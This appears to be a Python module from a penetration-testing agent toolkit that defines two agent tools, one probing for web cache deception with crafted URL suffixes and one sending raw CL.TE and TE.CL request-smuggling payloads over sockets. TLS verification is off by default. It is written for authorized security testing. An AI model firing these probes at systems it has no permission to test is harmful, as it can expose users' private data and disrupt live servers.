"""Differential network-layer bugs: web cache deception + request smuggling.

Both are 2025 high-impact classes where the proof is that one request affects
another response.

- Cache deception: append a static-looking suffix to a private URL; if an
  UNauthenticated fetch of that crafted URL returns the victim's private body
  (the cache stored and re-served it), it's confirmed.
- Request smuggling: send a CL.TE / TE.CL desync probe over a raw socket; if the
  probe hangs (the back-end waits for bytes the front-end already forwarded)
  while a normal request returns fast, the boundary desynchronises.
"""

from __future__ import annotations

import asyncio
import contextlib
import hashlib
import json
import os
import socket
import ssl
import time
from typing import Any
from urllib.parse import urlparse

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl


_CACHE_SUFFIXES = ("/nonexistent.css", "/nonexistent.js", ";.css", "%2fnonexistent.css")
_CACHE_HEADERS = ("x-cache", "cf-cache-status", "age", "x-served-by")


def _digest(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8", "replace")).hexdigest()[:16]


def _craft(url: str, suffix: str) -> str:
    parsed = urlparse(url)
    path = parsed.path or "/"
    new_path = path.rstrip("/") + suffix if suffix.startswith("/") else path + suffix
    return parsed._replace(path=new_path).geturl()


def _cache_deception_impl(
    url: str, headers: dict[str, str] | None, timeout: int
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    if not headers:
        return {"success": False, "error": "headers must carry the victim session"}

    base = _replay_impl("GET", url, headers, None, timeout, allow_redirects=False)
    if not base.get("success"):
        return {"success": False, "error": f"base request failed: {base.get('error')}"}
    private_digest = _digest(base.get("body") or "")

    results: list[dict[str, Any]] = []
    leaked = False
    for suffix in _CACHE_SUFFIXES:
        crafted = _craft(url, suffix)
        unauth = _replay_impl("GET", crafted, None, None, timeout, allow_redirects=False)
        if not unauth.get("success"):
            results.append({"crafted": crafted, "error": unauth.get("error")})
            continue
        body = unauth.get("body") or ""
        resp_headers = {k.lower(): v for k, v in (unauth.get("response_headers") or {}).items()}
        cache_hit = any(h in resp_headers for h in _CACHE_HEADERS)
        served_private = (
            isinstance(unauth.get("status_code"), int)
            and 200 <= unauth["status_code"] < 300
            and _digest(body) == private_digest
        )
        if served_private:
            leaked = True
        results.append(
            {
                "crafted": crafted,
                "status": unauth.get("status_code"),
                "served_private_to_anon": served_private,
                "cache_headers": {h: resp_headers[h] for h in _CACHE_HEADERS if h in resp_headers},
                "cache_hit_header": cache_hit,
            }
        )
    return {
        "success": True,
        "url": url,
        "possible_cache_deception": leaked,
        "results": results,
    }


def _raw_exchange(
    host: str, port: int, use_tls: bool, payload: bytes, timeout: int
) -> dict[str, Any]:
    """Send raw bytes, read until the server closes or we time out. Returns
    elapsed seconds and whether the read timed out (the desync tell)."""
    started = time.monotonic()
    sock: socket.socket | None = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            # ponytail: authorized pentest targets often have self-signed/expired
            # certs; verifying would block testing them. Set STRIX_TLS_VERIFY=1 to
            # require a valid cert.
            if os.environ.get("STRIX_TLS_VERIFY") != "1":
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(payload)
        sock.settimeout(timeout)
        data = b""
        timed_out = False
        try:
            while len(data) < 65536:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
        except TimeoutError:
            timed_out = True
        return {
            "ok": True,
            "elapsed": round(time.monotonic() - started, 2),
            "timed_out": timed_out,
            "bytes": len(data),
        }
    except OSError as exc:
        return {"ok": False, "error": str(exc), "elapsed": round(time.monotonic() - started, 2)}
    finally:
        if sock is not None:
            with contextlib.suppress(OSError):
                sock.close()


def _smuggling_payloads(host: str) -> dict[str, bytes]:
    normal = (
        f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    ).encode()
    # CL.TE: front-end honours Content-Length, back-end honours Transfer-Encoding.
    clte = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n"
        "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
        "1\r\nA\r\nX"
    ).encode()
    # TE.CL: reverse. The trailing chunk size makes the back-end wait for bytes.
    tecl = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n"
        "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\nX"
    ).encode()
    return {"normal": normal, "cl.te": clte, "te.cl": tecl}


def _request_smuggling_impl(url: str, timeout: int) -> dict[str, Any]:
    parsed = urlparse(url)
    if not parsed.netloc:
        return {"success": False, "error": "url must be absolute (https://host/…)"}
    use_tls = parsed.scheme != "http"
    host = parsed.hostname or ""
    port = parsed.port or (443 if use_tls else 80)
    payloads = _smuggling_payloads(host)

    baseline = _raw_exchange(host, port, use_tls, payloads["normal"], timeout)
    if not baseline.get("ok"):
        return {"success": False, "error": f"baseline connection failed: {baseline.get('error')}"}
    base_hung = baseline.get("timed_out")

    results: list[dict[str, Any]] = []
    desync = False
    for name in ("cl.te", "te.cl"):
        probe = _raw_exchange(host, port, use_tls, payloads[name], timeout)
        # Desync tell: the probe hangs (waiting for smuggled bytes) while the
        # normal request returned promptly.
        hung = bool(probe.get("ok") and probe.get("timed_out") and not base_hung)
        if hung:
            desync = True
        results.append(
            {
                "variant": name,
                "elapsed": probe.get("elapsed"),
                "timed_out": probe.get("timed_out"),
                "desync_signal": hung,
            }
        )
    return {
        "success": True,
        "url": url,
        "baseline_elapsed": baseline.get("elapsed"),
        # ponytail: timing heuristic only — confirm a flagged desync by hand
        # (self-poison a follow-up request) before filing.
        "possible_request_smuggling": desync,
        "results": results,
    }


@function_tool(timeout=120, strict_mode=False)
async def cache_deception_probe(
    ctx: RunContextWrapper,
    url: str,
    headers: dict[str, str],
    timeout: int = 15,
) -> str:
    """Test a private URL for web cache deception.

    Appends static-looking suffixes (``/x.css``, ``;.css``, …) to the URL and
    fetches each WITHOUT auth. If an unauthenticated fetch returns the victim's
    private body (same digest as the authed base response), the cache stored and
    re-served private content — confirmed. Only test authorized targets.

    Returns JSON with per-variant ``served_private_to_anon`` + cache headers and
    an overall ``possible_cache_deception``.

    Args:
        url: A URL that returns private, per-user content when authenticated.
        headers: The victim session headers (Cookie/Authorization).
        timeout: Per-request timeout in seconds (default 15).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(_cache_deception_impl, url, headers, timeout),
        ensure_ascii=False,
        default=str,
    )


@function_tool(timeout=120, strict_mode=False)
async def request_smuggling_probe(ctx: RunContextWrapper, url: str, timeout: int = 6) -> str:
    """Timing-probe a host for HTTP request smuggling (CL.TE / TE.CL desync).

    Sends a normal request and two desync probes over a raw socket. If a probe
    hangs (the back-end waits for bytes the front-end already forwarded) while
    the normal request returns fast, the front-end/back-end boundary
    desynchronises — ``possible_request_smuggling``. This is a timing heuristic;
    confirm by hand (self-poison a follow-up request) before filing. Only test
    authorized targets.

    Returns JSON with per-variant ``elapsed`` / ``timed_out`` / ``desync_signal``
    and an overall ``possible_request_smuggling``.

    Args:
        url: Absolute target URL (``https://host/``).
        timeout: Socket read timeout in seconds — the hang threshold (default 6).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(_request_smuggling_impl, url, timeout),
        ensure_ascii=False,
        default=str,
    )
